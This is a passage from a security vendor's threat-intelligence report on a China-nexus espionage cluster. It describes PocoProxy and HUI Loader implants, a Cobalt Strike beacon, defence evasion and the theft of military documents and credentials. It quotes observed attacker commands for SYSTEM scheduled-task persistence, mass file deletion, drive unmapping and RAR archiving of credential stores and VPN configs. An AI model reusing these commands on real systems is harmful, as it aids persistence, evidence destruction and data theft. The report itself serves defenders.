<p>Shortly after, the threat actor deployed the last PocoProxy binary (<strong>a8.txt) </strong>and executed it to establish communications to a new C2 IP <strong>139.180.217[.]105</strong> before running a scheduled task to establish additional <strong>a8.txt</strong> implants on various domain controllers and servers.</p>
<pre>schtasks  /Create    /RU system /sc onstart /TN "\Microsoft\Windows\config_bkb" /TR " c:\windows\system32\rundll32.exe</pre>
<h3>HUI Loader to drop Cobalt Strike</h3>
<p>In addition to using PocoProxy for C2, the actors in Cluster Charlie were observed executing a custom malware loader in August called HUI loader, which is <a href="https://www.sentinelone.com/labs/chinese-entanglement-dll-hijacking-in-the-asian-gambling-sector/">reported</a> to often be sideloaded by legitimate executables and used by several China-nexus actors to stage encrypted payloads.</p>
<p>In this case, the benign file <strong>identity_helper.exe</strong> sideloaded the HUI loader (<strong>msedge_elf.dll</strong>), which de-obfuscated the file <strong>log.ini </strong>to reveal a Cobalt Strike reflective Loader and a Cobalt Beacon injected into <strong>mstsc.exe</strong>. The Beacon attempted to communicate to the domain <strong>&lt;redacted&gt;dnsspeedtest2022[.]com, </strong>but the shellcode injection was blocked by a behavioral protection rule.</p>
<figure id="attachment_955549" aria-describedby="caption-attachment-955549" style="width: 640px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png"><img loading="lazy" decoding="async" class="size-full wp-image-955549" src="https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png" alt="Cobalt Strike Beacon configuration recovered from memory" width="640" height="357" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png 1595w, https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png?resize=300,167 300w, https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png?resize=768,429 768w, https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png?resize=1024,571 1024w, https://news.sophos.com/wp-content/uploads/2024/05/Cobalt-Strike-Beacon-configuration-recovered-from-memory.png?resize=1536,857 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-955549" class="wp-caption-text">Figure 27: Cobalt Strike Beacon configuration recovered from memory</figcaption></figure>
<h2 id="c-evade">Defense Evasion</h2>
<p>The actor in Cluster Charlie was thorough in terminating running processes via the <strong>taskkill </strong>command and deleting scheduled tasks after execution.</p>
<pre>taskkill  /im 8012 /f</pre>
<p>In the WinRS discovery efforts in August, Sophos MDR observed the output of <strong>ping </strong>and <strong>wevtutil </strong>commands being directed to various <strong>.txt </strong>files. Throughout this activity, the actor ran commands to delete all <strong>.txt</strong>, <strong>.exe</strong>, and <strong>.dat</strong> files in the current directory.</p>
<pre>C:\WINDOWS\system32\cmd.exe /C del *.exe

C:\WINDOWS\system32\cmd.exe /C del *.dat

C:\WINDOWS\system32\cmd.exe /C del *.txt</pre>
<p>The actor also repeatedly disconnected all active network drive mappings in a likely effort to evade detection and complicate forensic analysis.</p>
<pre>C:\WINDOWS\system32\cmd.exe /C net use * /d /y</pre>
<h2 id="c-exfil">Exfiltration</h2>
<p>While continuing to monitor the victim environment in November 2023, Sophos MDR hunters observed activity aligning with Cluster Charlie attempting to collect and exfiltrate a trove of highly sensitive information, including:</p>
<ul>
<li>Numerous documents related to military, cybersecurity, and economic interests – many pertaining to the country’s military strategy in the South China Sea</li>
<li>The Windows and Web Credential Store of several administrators (including the cloud admin)</li>
<li>Individual VoIP phone databases of multiple administrators and other staff</li>
<li>Cloud OpenVpn certificates and configurations, data backup project documentation, and switching infrastructure</li>
<li>Disaster recovery data, network device data, and email data</li>
<li>Services data such as IP block assignments, server blade configurations, DMZ configurations, server and backup server inventory, network diagrams, and lists of domain users</li>
<li>Extensive data from the Mobile Device Manager (MDM) solution, including configuration, server tokens, encryption keys, and device certificates</li>
</ul>
<p>To capture this data, the actor compressed the files and applied encryption to their contents.</p>
<pre>"C:\windows\debug\rar.dat" a -m5 C:\windows\debug\97.rar C:\windows\debug\viber.db

c:\windows\debug\rar.dat a c:\windows\debug\4.rar @c:\windows\debug\logadmin.dat

"c:\windows\debug\rar.dat" a c:\windows\debug\az.rar -x*.msi -x*.exe -x*.bak -x*.pst -x*.iso -v100M -r "\\172.xx.xxx.xx\D$\OneDrive - &lt;REDACTED&gt;\AZURE OPENVPN</pre>
<p>From a strategic aspect, the actor was able to collect many sensitive military and political documents, as well as the VoIP phone database files of multiple administrators, which can be used to restore messages. To support further in-depth access, the actor also captured documentation on nearly all infrastructure in the environment, as well as administrator credentials and token data for MDM servers, which can be used to decrypt communications, modify/wipe data, or request new certificates and enroll unauthorized devices.</p>
<p>Indicators of compromise for Cluster Charlie can be found on the Sophos GitHub page <a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_stac1305_charlie.csv">here</a>.</p>
<h2 id="iocs">Indicators of Compromise</h2>
<p>The following linked files on Sophos&#8217; GitHub page contain IoCs for each of the sets of activity described in this report. Additionally, we have provided IoCs from activity after August of 2023 related to this case:</p>
<ul>
<li><a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_stac1248-alpha.csv">Cluster Alpha (STAC1248)</a></li>
<li><a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_stac1870_bravo.csv">Cluster Bravo (STAC1870)</a></li>
<li><a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_stac1305_charlie.csv">Cluster Charlie(STAC1305)</a></li>
<li><a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_prior_intrusions.csv">Previous compromises</a></li>
<li><a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_post-08-2023.csv">Post-August activity</a></li>
</ul>
			</div>
	<div class="mt-12">
		
<ul
	id="social-sharing"
	class="flex justify-center items-center space-x-6"
>
	<li class="facebook">
		<a
			class="js-share-modal"
			href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=955433&#038;title=Operation%20Crimson%20Palace:%20A%20Technical%20Deep%20Dive"
			data-title="Operation Crimson Palace: A Technical Deep Dive"
			title="Share on Facebook">
				<span class="sr-only">Share on Facebook</span>
				<svg
					width="8"
					height="16"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M7.145 8.006H4.903V16H1.581V8.006H0V5.182h1.581V3.354C1.581 2.045 2.202 0 4.933 0l2.461.01v2.742H5.608c-.291 0-.705.145-.705.77v1.66h2.533l-.291 2.824z" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="twitter">
		<a
			class="js-share-modal"
			href="http://twitter.com/intent/tweet?text=Operation%20Crimson%20Palace%3A%20A%20Technical%20Deep%20Dive%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D955433"
			data-title=""
			title="Share on X">
				<span class="sr-only">Share on X</span>
				<svg
					xmlns="http://www.w3.org/2000/svg"
					width="16"
					height="16"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M12.163 1.5h2.206L9.55 7.006l5.669 7.494H10.78L7.303 9.956 3.328 14.5h-2.21l5.154-5.89L.838 1.5h4.55l3.14 4.153zm-.776 11.681h1.222L4.722 2.75H3.409z"/>
				</svg>
		</a>
	</li>
	<li class="linkedin">
		<a
			href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/"
			data-title="Operation Crimson Palace: A Technical Deep Dive"
			title="Share on LinkedIn"
			onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;">
			<span class="sr-only">Share on LinkedIn</span>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M16 15.293h-3.43v-5.52c0-1.386-.496-2.334-1.738-2.334-.946 0-1.512.64-1.76 1.256-.09.22-.113.526-.113.836v5.762H5.53s.044-9.35 0-10.316h3.43v1.46c.456-.705 1.27-1.703 3.091-1.703 2.256 0 3.95 1.473 3.95 4.643v5.916zM1.917 3.566h-.022C.745 3.566 0 2.773 0 1.783 0 .772.768 0 1.94 0c1.173 0 1.896.772 1.917 1.783 0 .99-.744 1.783-1.94 1.783zM.202 15.293h3.431V4.977H.203v10.316z" fill-rule="nonzero"/>
			</svg>
		</a>
	</li>
	<li class="comments">
		<a
			href="#comments"
			title="Leave a Reply"
			class="flex items-center space-x-1"
		>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M8.5 0a7.5 7.5 0 11-3.916 13.898C3.317 15.273 1.773 15.36.256 15.135c1.011-1.185 1.678-2.357 2-3.517l-.007.027A7.5 7.5 0 018.5 0z" fill-rule="evenodd"/>
			</svg>
					</a>
	</li>
</ul>

			</div><!-- .entry-social -->
	</div>

</article><!-- #post-## -->

			<div class="container my-8 md:my-16">
				<div class="max-w-4xl mx-auto">
					<div class="article-author-block article-co-authors-block">
	
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2023/07/Morgan-profile.jpg?w=400" class="avatar avatar-400 photo wp-post-image" alt="Morgan Demboski, Sophos X-Ops (MDR)" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/morgan-demboski/" title="Posts by Morgan Demboski" class="author url fn" rel="author">Morgan Demboski</a>						</h3>

						
							<div class="author-block__bio">
								<p>Morgan is a Threat Intelligence Analyst for the Sophos Managed Detection and Response (MDR) team, where her focuses include tactical cyber intelligence, data enrichment, and monitoring emerging threats. With a Masters in Intelligence and Security Studies, her areas of interest span beyond the cyber realm to include geopolitics and international security. In past roles, Morgan worked in the Network Detection and Response (NDR) space, where she focused on tracking attack patterns, analyzing command-and-control infrastructure, and threat research reporting.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
					<div class="author-block">
				<div class="author-block__profile">
					<img width="397" height="400" src="https://news.sophos.com/wp-content/uploads/2023/04/paulj.bio_.image_.jpg?w=397" class="avatar avatar-400 photo wp-post-image" alt="Paul Jaramillo&#039;s bio photo" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/paul-jaramillo/" title="Posts by Paul Jaramillo" class="author url fn" rel="author">Paul Jaramillo</a>						</h3>

						
							<div class="author-block__bio">
								<p>Paul Jaramillo is an extremely passionate, technical, and results-oriented security professional with over 10 years of incident response and 15 years of IT experience. Previously working at Splunk, CrowdStrike, and the US DoE, Paul is currently Director of Threat Hunting &amp; Intelligence at Sophos. He has a long-distinguished record of reducing enterprise risk and guiding organizations to an improved security posture. Some highlights include breaking into a 2-factored VPN as a pen tester, successfully investigating an insider threat case across the globe as a forensic examiner, and hunting and ejecting nation-state adversaries from corporate and government networks.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2024/06/mark.jpg?w=400" class="avatar avatar-400 photo wp-post-image" alt="Mark Parsons" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/mark-parsons/" title="Posts by Mark Parsons" class="author url fn" rel="author">Mark Parsons</a>						</h3>

						
							<div class="author-block__bio">
								<p>Mark Parsons is a threat hunter for Sophos Managed Detection and Response. He specializes in threat hunting, digital forensics, and incident response. Previous notable achievements include identifying multi-month nation state intrusions; working with multiple states’ cybersecurity programs before, during, and after the 2020 election cycle to improve their detection and response capabilities; finding rarely seen (second reporter) bugs in Microsoft Azure/CAP logs; and identifying multiple initial access brokers prior to their targets’ being compromised by second actors.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
		
		</div>
				</div>
			</div>

			
<div class="pb-24 bg-white">
<div class="container">
<div class="max-w-5xl mx-auto">

			
			<h3 class="text-style-h2 md:my-8 my-4">
				Read Similar Articles			</h3>

			<div class="article-grid article-grid--3-column">
				<!-- Article -->
<article
	id="post-75410"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75410 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-encryption tag-mtr tag-ransomware tag-security tag-sidebar tag-sophos-rapid-response region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-ransomware-web-banner-1200x628px-option-2.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 24, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What to expect when you’ve been hit with Avaddon ransomware</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75301"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75301 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-intercept-x tag-sidebar tag-sophos-edr tag-sophos-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-edr-news-blog-image-838x440px@2x.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What&#8217;s New in Sophos EDR 4.0</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75396"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75396 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-sidebar tag-sophos-xdr tag-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-xdr.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">Sophos XDR: Driven by data</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
			</div>

	
</div>
</div>
</div> <!-- #secondary -->

			
		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div> <!-- #content -->

	

<div class="bg-sophos-gray-50 md:py-16 px-4" x-data="subscribeForm()">
	<div class="container max-w-2xl" x-show="!subscribed">
	<div class="text-style-h2-lg">
		Subscribe to get the latest updates in your inbox.	</div>
	<form action="">
		<div class="flex flex-col my-6">
		<input
			type="text"
			placeholder="name@email.com"
			class="w-full"
			x-model="email"
			x-on:keydown="resetErrors()"
			required
		/>
		<div
			x-cloak
			x-show="message"
			x-text="message"
			class="font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md"
		></div>
		</div>
		<div class="mb-4 text-lg">
			Which categories are you interested in?		</div>
		<div class="my-2 space-y-1">
		<template
			x-for="category in Object.entries(categories)"
			:key="category[0]"
		>
			<div>
			<label
				x-bind:for="category[1].value"
				class="inline-flex items-center"
			>
				<input
				type="checkbox"
				x-bind:value="category[1].value"
				x-bind:id="category[1].value"
				x-bind:name="category[1].value"
				x-model="subscribeTo"
				/>
				<span
				class="text-style-form-label ml-2"
				x-text="category[1].name"
				>
				</span>
			</label>
			</div>
		</template>
		</div>
		<div class="mt-6">
		<input
			type="submit"
			class="round-button round-button--primary"
			@click.prevent="submit()"
			x-bind:value="buttonText()"
			x-bind:class="{ 'opacity-30 cursor-not-allowed': buttonDisabled() }"
			x-bind:disabled="buttonDisabled()"
		/>
		</div>
	</form>
	</div>

	<div class="container max-w-2xl" x-cloak x-show="subscribed && !loading">
	<div class="text-style-h2 md:text-3xl mb-4 text-2xl text-center">
		You’re now subscribed!	</div>
	<div
		class="text-lg text-center"
		x-text="`Check your email to confirm your subscription.`"
	></div>
	</div>
</div>

<script>
	let subscribeForm = function () {
	return {
		config: {
		endpoints: {
			signup:
			"https://sophos-mailchimp-signup.netlify.app/.netlify/functions/newsletter-signup",
		},
		},
		subscribed: false,
		loading: false,
		error: false,
		message: "",
		categories: {
		1: {
			name: decodeURIComponent( 'Products%20and%20Services' ),
			value: "products-services",
		},
		2: {
			name: decodeURIComponent( 'Threat%20Research' ),
			value: "threat-research",
		},
		3: {
			name: decodeURIComponent( 'Security%20Operations' ),
			value: "security-operations",
		},
		4: {
			name: decodeURIComponent( 'AI%20Research' ),
			value: "ai-research",
		},
		5: {
			name: decodeURIComponent( '%23SophosLife' ),
			value: "sophos-life",
		},
		},
		subscribeTo: [],
		email: "",

		reset() {
		this.loading = false;
		if (!this.error) {
			this.email = "";
		}
		},

		resetErrors() {
		this.error = false;
		this.message = "";
		},

		setError(message) {
		this.error = true;
		this.message = message;
		},

		setSuccess(message) {
		this.error = false;
		this.message = message;
		},

		emailIsValid(email) {
		return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
		},

		submit() {
		this.loading = true;
		this.resetErrors();

		const mcList = "8d6471d831";
		const mcLanguage = decodeURIComponent( 'en' );
		const mcTags = [...this.subscribeTo, mcLanguage];

		const payload = {
			email: this.email,
			listId: mcList,
			tags: mcTags,
			language: mcLanguage,
		};

		fetch(this.config.endpoints.signup, {
			method: "POST",
			headers: {
			"Content-Type": "application/json",
			},
			body: JSON.stringify(payload),
		})
			.then((r) => r.json())
			.then((data) => {
			if (data.status === "pending") {
				this.setSuccess(
					decodeURIComponent( 'You%20have%20been%20subscribed.%20Please%20check%20your%20email%20to%20confirm.' )
				);
				this.subscribed = true;
			} else if (
				data.status === "subscribed"
			) {
				this.setSuccess(
					decodeURIComponent( 'You%20are%20already%20subscribed.%20Thank%20you%21' )
				);
			} else {
				this.setError(
					decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
				);
			}
			})
			.catch((e) => {
			this.setError(
				decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
			);
			})
			.finally(() => {
			this.reset();
			});
		},

		buttonText() {
		return this.loading ? decodeURIComponent( 'Please%20Wait' ) : decodeURIComponent( 'Subscribe' );
		},

		buttonDisabled() {
		return (
			this.subscribeTo.length < 1 ||
			!this.emailIsValid(this.email) ||
			this.loading
		);
		},
	};
	};
</script>


	<footer
		class="bg-white border-t border-sophos-gray-200 "
		x-data="{ languageMenu: false, privacyMenu: false, legalMenu: false }"
	>
		<div class="container">
			<div class="md:flex-row md:items-center flex flex-col justify-between py-8">
				<div class="flex items-baseline flex-grow space-x-6">
					<!-- Language -->
					
<div class="relative mr-auto">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="languageMenu = !languageMenu"
		@click.away="languageMenu = false"
	>
		Change Region		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': languageMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>

	<!-- Language Menu -->
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="languageMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
											<li>
					<a href="https://news.sophos.com/es-419">
						América Latina					</a>
				</li>
															<li>
					<a href="https://news.sophos.com/pt-br">
						Brasil					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/de-de">
						Deutschland					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/en-us">
						English					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/fr-fr">
						France					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/es-es">
						Iberia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/it-it">
						Italia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/ja-jp">
						Japan					</a>
				</li>
									</ul>
	</div>
</div>

					<!-- Terms -->
					<a
						href="https://www.sophos.com/en-us/legal/sophos-website.aspx"
						class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block ml-auto text-xs font-medium leading-tight"
						>Terms</a
					>

					<!-- Privacy -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="privacyMenu = !privacyMenu"
		@click.away="privacyMenu = false"
	>
		Privacy
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': privacyMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="privacyMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx"
				>
					Privacy Notice				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/cookie-information.aspx"
				>
					Cookies				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Legal -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="legalMenu = !legalMenu"
		@click.away="legalMenu = false"
	>
		Legal
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': legalMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="legalMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal.aspx"
				>
					General				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx"
				>
					Modern Slavery Statement				</a>
			</li>
			<li>
				<a
					href="https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html"
				>
					Speak Out				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Copyright -->
					<div class="md:ml-6 mt-2 md:mt-0">
						<span
							class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
						>
							&copy; 1997 - 2024 Sophos Ltd. All rights reserved						</span>
					</div>
				</div>
			</div>
			</div>
		</div>
	</footer>
			<div id="amp-mobile-version-switcher" hidden>
			<a rel="" href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/?amp=1">
				Go to mobile version			</a>
		</div>

				<script type="text/javascript" id="sophos-js-core-js-extra">
/* <![CDATA[ */
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
/* ]]> */
</script>
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJyVjFsKwyAQRTdUHR0I0o/StYgMibY+cKZNl19DNhDhfh3OubA3FWoRKgKyUSYGrm2rXGhnhcY6SDw2pPqKpL6oUdsB9Al04htc+gi1T9j0k+75un8i/ZH4nq+Cz83HtUyHzXcp1Ke71U8nBxvRMz+sQ1yMc3eT/qCJoEA=" ></script><script type="text/javascript" src="https://unpkg.com/alpinejs@2.8.1/dist/alpine.js?ver=2.0.3" id="alpine-js-js"></script>
<script type="text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"166161023\",\"post\":\"955433\",\"tz\":\"-4\",\"srv\":\"news.sophos.com\",\"hp\":\"vip\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "166161023", "955433" ]);
/* ]]> */
</script>
</body>
</html>
